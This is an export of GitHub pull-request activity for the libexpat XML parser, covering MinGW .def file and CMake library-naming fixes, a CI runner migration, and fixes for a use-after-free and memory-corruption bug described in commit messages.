611,IssueComment,2022-07-19 05:15:04,eli-schwartz,fork_merge,"expat_external.h can set up GNU symbol visibility as well as Windows declspec. If declspec is set up then a def file may not be necessary at all, even with MSVC.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1188607523"", ""author_association"": ""NONE""}"
611,IssueComment,2022-07-20 22:14:39,hartwork,fork_merge,"> An alternative to this PR is to do
> 
> ```
> LIBRARY libexpat.dll
> ```
> 
> what do you think?

@neheb the library name varies, so it's not always `libexpat.dll` but e.g. `libexpatw.dll`. So if that part is more than cosmetic, then the file well need to be a template (rendered by CMake) to make it match build artifact filename reality. If in contrast it's purely cosmetic, a fixed name will be confusing. So before touching this ""just for MinGW"" I'd want to be sure that a MinGW build would benefit from those files or would need fixing.

> expat_external.h can set up GNU symbol visibility as well as Windows declspec. If declspec is set up then a def file may not be necessary at all, even with MSVC.

@eli-schwartz dropping those files would be awesome (e.g. for issue #512), but we have holes in the export symbol numbers…

https://github.com/libexpat/libexpat/blob/68e60b56779148eca06cfd2d9ac1d7f343f22954/expat/lib/libexpat.def#L73-L76

… so I'm expecting we may break ABI for someone, if we drop `.def` files. What do you think?

PS: I find it remarkable how not helpful the official docs on section `LIBRARY` are https://docs.microsoft.com/en-us/cpp/build/reference/library?view=msvc-170 . No examples, no word on whether a section `LIBRARY` is needed or the syntax of the name. Wow :smiley: 


","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1190814723"", ""author_association"": ""MEMBER""}"
611,IssueComment,2022-07-20 22:38:54,eli-schwartz,fork_merge,"The official docs are also clear as mud on whether you need both dllimport and dllexport, or only dllexport. Eventually I found a repository that explained this in a commit message, which was a real eye-opening experience. MSVC is just pure pain to work with, honestly.

> … so I'm expecting we may break ABI for someone, if we drop `.def` files. What do you think?

I don't really know what an export number is, but I guess it may be the same as GNU ld version scripts appending a symbol version? In which case that would break ABI, yes.

If there's a risk of breaking ABI, then I suppose you can just drop it whenever you next intend to break ABI anyway. Breaking ABI is not so much of a problem compared to breaking ABI and not bumping the soname/dll name to make that visible to consumers. :D","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1190837845"", ""author_association"": ""NONE""}"
611,IssueComment,2022-07-20 22:47:11,neheb,fork_merge,"> PS: I find it remarkable how not helpful the official docs on section `LIBRARY` are https://docs.microsoft.com/en-us/cpp/build/reference/library?view=msvc-170 . No examples, no word on whether a section `LIBRARY` is needed or the syntax of the name. Wow ????

In my experience it is not needed. Only if you want to mandate a certain dllname with a suffix and what not (eg libexpat-1.dll)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1190842804"", ""author_association"": ""CONTRIBUTOR""}"
611,ReviewApproved,2022-07-27 23:14:51,hartwork,fork_merge,"@neheb @eli-schwartz I have played with this some more and it seems that this change indeed helps MinGW support and does not seem to hurt MSVC support. I'll merge this for a start and create a new pull request that (1) makes use of the .def file for MinGW in the CMake build system and (2) auto-generates the .def file from a template to address issue #512…
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/611#pullrequestreview-1053322729""}"
611,RenameTitle,2022-07-27 23:16:32,hartwork,fork_merge,,"{""rename"": {""from"": ""expat: fix def files for MinGW"", ""to"": ""Fix .def files syntax for MinGW""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7077091160""}"
611,Labeled,2022-07-27 23:16:43,hartwork,fork_merge,enhancement,
611,Labeled,2022-07-27 23:16:43,hartwork,fork_merge,compilation,
611,Labeled,2022-07-27 23:16:43,hartwork,fork_merge,windows,
611,MergePR,2022-07-27 23:17:03,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7077093044"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/89dc0f26ee57a1faab4a8cfe865a9f831aab58aa""}"
611,DeleteBranch,2022-07-27 23:21:43,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7077107814"", ""commit_url"": null}"
611,CrossReferenced,2022-07-30 19:12:23,hartwork,fork_merge,CMake: Render .def file from a template to fix linking (fixes #512) + apply .def file with MinGW,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/621"", ""is_pull_request"": true}}"
614,SubmitCommit,2022-07-22 13:06:14,Tieske,fork_merge,fix(docs) update XML_DTD symbol visibility,"{""sha"": ""f1a5b316fb30320bc8a232e4d88a5754f741ce3b"", ""author"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-07-22T13:06:14Z""}, ""committer"": {""name"": ""Thijs Schreijer"", ""email"": ""thijs@thijsschreijer.nl"", ""date"": ""2022-07-22T13:06:14Z""}}"
614,OpenPR,2022-07-22 13:07:52,Tieske,fork_merge,,
614,Labeled,2022-07-27 22:21:20,hartwork,fork_merge,bug,
614,Labeled,2022-07-27 22:21:20,hartwork,fork_merge,documentation,
614,ReviewApproved,2022-07-27 22:21:33,hartwork,fork_merge,@Tieske thank you!,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/614#pullrequestreview-1053288391""}"
614,MergePR,2022-07-27 22:21:48,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076888820"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ca2cc7ead666ca9d2fd0d3c73b5b2a814652c526""}"
614,DeleteBranch,2022-07-28 12:43:11,Tieske,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7081074421"", ""commit_url"": null}"
614,Referenced,2022-09-15 15:05:00,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915695"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
614,Referenced,2022-09-19 14:22:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155013"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
615,SubmitCommit,2022-07-22 13:52:14,RMJ10,fork_close,"Regression test for #612: tempPool corrupt from attribute types.

Attribute type declarations accumulate the type in m_tempPool.
When parsing is skipped because of (for example) a missing
parameter entity, the accumulated definition is not cleared out
as it normally would be, and corrupts the data passed to future
handlers.

Note this commit leaves the regression tests failing (which is
after all what we were trying to prove).","{""sha"": ""501eef9cc12445029cba5312b0ca984e9c6b7d12"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T13:52:14Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T13:52:14Z""}}"
615,SubmitCommit,2022-07-22 13:59:30,RMJ10,fork_close,Fix #612: clear m_tempPool when skipping entities in declarations,"{""sha"": ""20737ae9c1b961d79691deacac0ee54d8f4978d3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T13:59:30Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T13:59:30Z""}}"
615,OpenPR,2022-07-22 14:13:24,RMJ10,fork_close,,
615,Revise,2022-07-22 15:38:29,RMJ10,fork_close,Fix formatting of string constant,"{""sha"": ""4a51e465063ca0465419029fd776735a8feb7216"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T15:38:29Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T15:38:29Z""}}"
615,Revise,2022-07-22 15:54:21,RMJ10,fork_close,"More formatting fixes.

I happen to disagree with clang-format that this is at all
desirable, but hey ho.","{""sha"": ""13d0e13c23a7d7baf45a94d0fabc4493fcfb249d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T15:54:21Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T15:54:21Z""}}"
615,Revise,2022-07-22 16:11:44,RMJ10,fork_close,Only run pool integrity regression test if XML_DTD is defined,"{""sha"": ""13ea7f4b2e8a553101e32082c6c636748679e3b6"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T16:11:44Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-22T16:11:44Z""}}"
615,RenameTitle,2022-08-04 14:56:56,RMJ10,fork_close,,"{""rename"": {""from"": ""Issue 612"", ""to"": ""Clear m_tempPool when skipping entities""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7128699619""}"
615,RenameTitle,2022-08-13 21:01:39,hartwork,fork_close,,"{""rename"": {""from"": ""Clear m_tempPool when skipping entities"", ""to"": ""Clear m_tempPool when skipping entities (fixes #612)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7183795955""}"
615,CrossReferenced,2022-09-13 19:59:54,hartwork,fork_close,unfinished m_declAttributeType allocation in ->m_tempPool can corrupt following allocation,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/612"", ""is_pull_request"": false}}"
615,Labeled,2022-09-13 20:01:35,hartwork,fork_close,bug,
615,ReviewComment,2022-09-14 22:30:43,hartwork,fork_close,Related comment: https://github.com/libexpat/libexpat/issues/612#issuecomment-1247086697,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/615#pullrequestreview-1108285436""}"
615,CrossReferenced,2022-09-15 21:15:55,hartwork,fork_close,"Fix corruption from undefined entities (fixes #612, variation of #615)","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/645"", ""is_pull_request"": true}}"
615,IssueCommentSupplement,2022-09-20 14:42:36,hartwork,fork_close,Closing as superseded by variant pull request #645,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1252459879"", ""author_association"": ""MEMBER""}"
615,ClosePR,2022-09-20 14:42:36,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7423017683"", ""commit_url"": null}"
615,Referenced,2022-10-07 17:05:33,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545220973"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/eb976a36d0150402620e498420c9491422565fc1""}"
616,SubmitCommit,2022-07-22 13:35:28,c01db33f,fork_close,"Fix UAF due to DTD destruction.

If the allocation in parserInit fails:
parser->m_protocolEncodingName = copyString(encodingName, &(parser->m_mem));

Then we'll call XML_ParserFree on the parser inside parserCreate:
if (encodingName && ! parser->m_protocolEncodingName) {
  XML_ParserFree(parser);
  return NULL;
}

If we're inside XML_ExternalEntityParserCreate, this can mean that
XML_ParserFree is called on a parser whose m_dtd pointer is shared with the
document's root parser. Since the flag m_isParamEntity is only set in
XML_ExternalEntityParserCreate after parserCreate returns, this call to
XML_ParserFree will incorrectly destroy the shared dtd.

This fix moves the setting of m_isParamEntity into parserCreate, since the
dtd parameter is only non-NULL in this case.","{""sha"": ""7351331ce891d40965ec1ed113d0e745d4e9ef5a"", ""author"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-21T14:07:45Z""}, ""committer"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-22T13:35:28Z""}}"
616,SubmitCommit,2022-07-22 13:37:58,c01db33f,fork_close,"Fix memory leak.

In the handling of XML_TOK_END_TAG, we push tag onto parser->m_freeTagList.
If we then hit the error case, we'll return without pushing the tag's bindings
onto parser->m_freeBindingList, so the binding allocations will be leaked.","{""sha"": ""7d6768e3db335859ab44874020cd21d97fe64bad"", ""author"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-21T14:02:34Z""}, ""committer"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-22T13:37:58Z""}}"
616,OpenPR,2022-07-22 14:43:24,c01db33f,fork_close,,
616,Revise,2022-07-25 08:14:03,c01db33f,fork_close,Add XML_DTD guards around m_isParamEntity access.,"{""sha"": ""05c6788b364816f3c584f47e9819119138d151b0"", ""author"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-25T08:12:19Z""}, ""committer"": {""name"": ""Mark Brand"", ""email"": ""markbrand@google.com"", ""date"": ""2022-07-25T08:14:03Z""}}"
616,ReviewComment,2022-07-30 22:47:16,hartwork,fork_close,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/616#pullrequestreview-1056498752""}"
616,CrossReferenced,2022-09-21 01:24:41,hartwork,fork_close,[CVE-2022-43680] XML_ParserFree may free parser->m_dtd memory in out-of-memory situations when it should not,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/649"", ""is_pull_request"": false}}"
616,ReviewComment,2022-09-21 02:11:54,hartwork,fork_close,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/616#pullrequestreview-1114672467""}"
616,CrossReferenced,2022-09-22 15:10:54,hartwork,fork_close,XML_ParserReset may leak opening tag bindings after a closing tag mismatch error,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/652"", ""is_pull_request"": false}}"
616,CrossReferenced,2022-10-07 17:51:22,hartwork,fork_close,[CVE-2022-43680] Fix overeager DTD destruction (fixes #649),"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/650"", ""is_pull_request"": true}}"
616,IssueCommentSupplement,2022-10-07 18:03:13,hartwork,fork_close,"Closing as superseded by the issues…

- #649
- #652

…and the related pull requests…

- #650
- #653

…for the purpose of clarity.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1271888992"", ""author_association"": ""MEMBER""}"
616,ClosePR,2022-10-07 18:03:13,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545538244"", ""commit_url"": null}"
616,Labeled,2022-10-07 18:03:39,hartwork,fork_close,bug,
616,Labeled,2022-10-07 18:03:39,hartwork,fork_close,security,
619,SubmitCommit,2022-07-27 21:17:30,hartwork,unfork_merge,actions: Migrate from deprecated macos-10.15 to macos-11,"{""sha"": ""91432ad6013f1720f11b2ff4b7b6c10291604e4b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:07:40Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:17:30Z""}}"
619,SubmitCommit,2022-07-27 21:17:30,hartwork,unfork_merge,actions: Be explicit about macos-11,"{""sha"": ""7d6c0d8f41e8542caf8c31ede2988ec4e4d43f9c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:08:05Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:17:30Z""}}"
619,OpenPR,2022-07-27 21:18:44,hartwork,unfork_merge,,
619,MergePR,2022-07-27 21:51:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076756143"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/2ba1ae67d633f2ba041f74084861a7899d43bb50""}"
619,DeleteBranch,2022-07-30 18:19:05,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7095155786"", ""commit_url"": null}"
619,Referenced,2022-09-15 15:05:00,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915703"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
619,Referenced,2022-09-19 14:22:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155022"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
620,Labeled,2022-07-27 21:48:14,hartwork,unfork_merge,enhancement,
620,OpenPR,2022-07-27 21:48:14,hartwork,unfork_merge,,
620,Referenced,2022-07-27 21:51:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076758513"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/21e7c8f8f0d215aaee186abbc2343253ac4b22e9""}"
620,HeadRefForcePushed,2022-07-27 21:51:47,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076758524"", ""commit_url"": null}"
620,Revise,2022-07-27 21:57:50,hartwork,unfork_merge,cmake: Fix a CMAKE_*_POSTFIX leftover from pull request #608,"{""sha"": ""0e9bd32b309ca466cbf2fa020e47957db977ea14"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:34:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:57:50Z""}}"
620,Revise,2022-07-27 21:57:54,hartwork,unfork_merge,cmake: Improve documentation of variables EXPAT_*_POSTFIX,"{""sha"": ""ac6e1d0bf166fe11765963ae8ca410435ba2965b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:35:36Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:57:54Z""}}"
620,Revise,2022-07-27 21:58:25,hartwork,unfork_merge,cmake: Make all variable documentation start with a capital letter,"{""sha"": ""aa65f8cac74b1ea696e996366abcdc95ad4c12ab"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:37:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:58:25Z""}}"
620,Revise,2022-07-27 21:58:29,hartwork,unfork_merge,readme: Get CMake variables documentation back in sync,"{""sha"": ""d4ecd87e55c9d57dc3cf38578f15637022de2c43"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:38:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:58:29Z""}}"
620,Referenced,2022-07-27 21:59:14,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076791694"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fa78916cd53eb15c967df0112d10c61ec7846a3a""}"
620,HeadRefForcePushed,2022-07-27 21:59:15,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076791708"", ""commit_url"": null}"
620,Revise,2022-07-27 22:14:26,hartwork,unfork_merge,Changes: Document #608 and #620,"{""sha"": ""260c5190be3894d5be5a8e4e823dc41339ec9ee8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T21:41:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-27T22:14:26Z""}}"
620,HeadRefForcePushed,2022-07-27 22:15:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7076864046"", ""commit_url"": null}"
620,ReviewApproved,2022-07-28 16:22:19,dfaure-kdab,unfork_merge,"Looks great, thanks.","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/620#pullrequestreview-1054415481""}"
620,IssueComment,2022-07-28 20:20:46,hartwork,unfork_merge,"> Looks great, thanks.

@dfaure-kdab excellent, thanks for the review! :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1198593391"", ""author_association"": ""MEMBER""}"
620,MergePR,2022-07-28 20:21:04,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7084617897"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9c66cb375e91e12723e210209f50f78305a52e85""}"
620,DeleteBranch,2022-07-30 18:19:05,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7095155803"", ""commit_url"": null}"
621,SubmitCommit,2022-07-30 19:06:08,hartwork,unfork_merge,"cmake|windows: Render .def file from a template to fix linking

.. with -DEXPAT_DTD=OFF and/or -DEXPAT_ATTR_INFO=ON .","{""sha"": ""bc2d690ad4f84fa19f8959e8e9dea038523da551"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-30T18:43:35Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-30T19:06:08Z""}}"
621,SubmitCommit,2022-07-30 19:06:08,hartwork,unfork_merge,cmake: Apply .def file when linking with MinGW,"{""sha"": ""0fb9a6202227815cba9d5dfabbbbb10463150f24"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-30T18:53:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-07-30T19:06:08Z""}}"
621,Labeled,2022-07-30 19:12:23,hartwork,unfork_merge,bug,
621,Labeled,2022-07-30 19:12:23,hartwork,unfork_merge,compilation,
621,Labeled,2022-07-30 19:12:23,hartwork,unfork_merge,windows,
621,OpenPR,2022-07-30 19:12:23,hartwork,unfork_merge,,
621,ReviewApproved,2022-07-30 19:15:34,neheb,unfork_merge,,"{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/621#pullrequestreview-1056470699""}"
621,ReviewApproved,2022-07-31 14:36:24,Tieske,unfork_merge,"Lgtm only wondering if a similar change is necessary for the attribute info stuff, since that also changes symbol visibility iirc. But that could also be another PR. ","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/621#pullrequestreview-1056576189""}"
621,IssueComment,2022-07-31 14:40:49,hartwork,unfork_merge,"> Lgtm only wondering if a similar change is necessary for the attribute info stuff, since that also changes symbol visibility iirc. But that could also be another PR.

@Tieske thanks for having a look! Did you see the attribute info bits that are already included? What more would be needed on that aspect in your opinion?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1200438579"", ""author_association"": ""MEMBER""}"
621,IssueComment,2022-08-01 09:34:26,Tieske,unfork_merge,"Sorry, on mobile so hard to check. My thinking was; there were 2 directives, the dtd one and the attribute one, that changed symbol visibility. 

This pr ensure the def file follows the directive as well for the dtd part. Hence  my comment on the attribute one. 

If this was already taken care of, then apologies for the noise","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1200957914"", ""author_association"": ""CONTRIBUTOR""}"
621,CrossReferenced,2022-08-01 18:40:22,hartwork,unfork_merge,[>=2.4.0] [EXPAT_DTD=OFF] libexpat.def : error LNK2001: unresolved external symbol XML_SetBillionLaughsAttackProtectionActivationThreshold,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/512"", ""is_pull_request"": false}}"
621,IssueComment,2022-08-01 22:12:32,hartwork,unfork_merge,"@Tieske thanks for the update, I think we're good to go then…","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1201779069"", ""author_association"": ""MEMBER""}"
621,IssueComment,2022-08-01 22:12:56,hartwork,unfork_merge,@neheb thanks for the review! :+1: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1201779529"", ""author_association"": ""MEMBER""}"
621,MergePR,2022-08-01 22:13:04,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7105232478"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e12e9ffb95f4f99c003050c782a76803567255d7""}"
621,DeleteBranch,2022-08-01 22:18:49,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7105261942"", ""commit_url"": null}"
624,Labeled,2022-08-01 22:38:48,hartwork,unfork_merge,enhancement,
624,Labeled,2022-08-01 22:38:48,hartwork,unfork_merge,windows,
624,OpenPR,2022-08-01 22:38:48,hartwork,unfork_merge,,
624,Labeled,2022-08-01 22:38:48,hartwork,unfork_merge,compilation,
624,HeadRefForcePushed,2022-08-01 22:52:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7105400598"", ""commit_url"": null}"
624,IssueComment,2022-08-02 07:05:29,vtorri,unfork_merge,"unfortunately, -1 is also added to the import library.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1202099996"", ""author_association"": ""NONE""}"
624,IssueComment,2022-08-02 18:52:05,hartwork,unfork_merge,"> unfortunately, -1 is also added to the import library.

@vtorri interesting catch :+1: How much of a proplem would that be in practice?

From what I can see so far, to unclude the `.dll.a` file naming but not the `.dll` file naming, variables`ARCHIVE_OUTPUT_NAME[_<CONFIG>]` may be our only option, the naming I see in practice is this:

- `lib${ARCHIVE_OUTPUT_NAME}${POSTFIX}.dll`
- `lib${RUNTIME_OUTPUT_NAME}${POSTFIX}.dll.a`

So that means:
- We cannot put `-1` in postfix because it would affect both filenames.
- Because `-1` needs to be at the end, (without hacks) postfix would need to be empty.
- A working hack would be to move the current postfix values to `[<CONFIG>_]OUTPUT_NAME` but it's rather ugly.

What do you think?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203093415"", ""author_association"": ""MEMBER""}"
624,IssueComment,2022-08-02 20:41:42,vtorri,unfork_merge,"The patch that seems to work is:

```
diff --git a/expat/CMakeLists.txt b/expat/CMakeLists.txt
index e3bc07fe..5472ba18 100644
--- a/expat/CMakeLists.txt
+++ b/expat/CMakeLists.txt
@@ -385,7 +385,17 @@ else()
     set(_SHARED STATIC)
 endif()
 
+set(LIBCURRENT 9)   # sync
+set(LIBREVISION 8)  # with
+set(LIBAGE 8)       # configure.ac!
+math(EXPR LIBCURRENT_MINUS_AGE ""${LIBCURRENT} - ${LIBAGE}"")
+
 add_library(expat ${_SHARED} ${_EXPAT_C_SOURCES} ${_EXPAT_EXTRA_SOURCES})
+
+if(MINGW)
+    set_target_properties(expat PROPERTIES SUFFIX -${LIBCURRENT_MINUS_AGE}.dll)
+endif()
+
 if(_EXPAT_LIBM_FOUND)
     target_link_libraries(expat m)
 endif()
@@ -425,11 +435,6 @@ foreach(build_type_upper
     set_property(TARGET expat PROPERTY ${build_type_upper}_POSTFIX ${EXPAT_${build_type_upper}_POSTFIX})
 endforeach()
 
-set(LIBCURRENT 9)   # sync
-set(LIBREVISION 8)  # with
-set(LIBAGE 8)       # configure.ac!
-math(EXPR LIBCURRENT_MINUS_AGE ""${LIBCURRENT} - ${LIBAGE}"")
-
 if(NOT WIN32)
     set_property(TARGET expat PROPERTY VERSION ${LIBCURRENT_MINUS_AGE}.${LIBAGE}.${LIBREVISION})
     set_property(TARGET expat PROPERTY SOVERSION ${LIBCURRENT_MINUS_AGE})
```

i would even move the LIB* version at the beginning of CMakeLists.txt, just after the expat version (around line 71, or line 78)


output of `make install` : 

```
C:/Documents/msys2/mingw64/bin/cmake.exe -P cmake_install.cmake
-- Install configuration: ""Release""
-- Installing: C:/Documents/msys2/opt/expat/include/expat_config.h
-- Installing: C:/Documents/msys2/opt/expat/lib/libexpat.dll.a
-- Installing: C:/Documents/msys2/opt/expat/bin/libexpat-1.dll
-- Up-to-date: C:/Documents/msys2/opt/expat/include/expat.h
-- Up-to-date: C:/Documents/msys2/opt/expat/include/expat_external.h
-- Installing: C:/Documents/msys2/opt/expat/lib/pkgconfig/expat.pc
-- Up-to-date: C:/Documents/msys2/opt/expat/share/doc/expat/AUTHORS
-- Installing: C:/Documents/msys2/opt/expat/share/doc/expat/changelog
-- Installing: C:/Documents/msys2/opt/expat/lib/cmake/expat-2.4.8/expat-config.cmake
-- Installing: C:/Documents/msys2/opt/expat/lib/cmake/expat-2.4.8/expat-config-version.cmake
-- Installing: C:/Documents/msys2/opt/expat/lib/cmake/expat-2.4.8/expat.cmake
-- Installing: C:/Documents/msys2/opt/expat/lib/cmake/expat-2.4.8/expat-release.cmake
```
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203194327"", ""author_association"": ""NONE""}"
624,HeadRefForcePushed,2022-08-02 21:44:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7113674191"", ""commit_url"": null}"
624,IssueComment,2022-08-02 21:46:56,hartwork,unfork_merge,"@vtorri I get the idea behind that hack now, nice one! :+1: I have applied that idea of yours now, let's see how the CI likes it.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203245684"", ""author_association"": ""MEMBER""}"
624,HeadRefForcePushed,2022-08-02 21:48:43,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7113692422"", ""commit_url"": null}"
